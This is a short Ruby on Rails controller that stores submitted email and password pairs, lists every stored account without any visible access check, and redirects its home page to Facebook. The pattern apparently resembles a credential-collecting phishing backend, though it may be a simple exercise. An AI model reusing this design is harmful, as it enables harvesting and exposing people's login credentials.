class AccountController < ApplicationController

	def home
		@account = Account.new
		redirect_to 'http://www.facebook.com'
	end

	def index
		@accounts = Account.all
	end

	def new
		@account = Account.new
	end

	def create
		@account = Account.new(account_params)
		@account.save!

		redirect_to '/'	
	end

	def account_params
		params.require(:account).permit(:email, :password)
	end
end
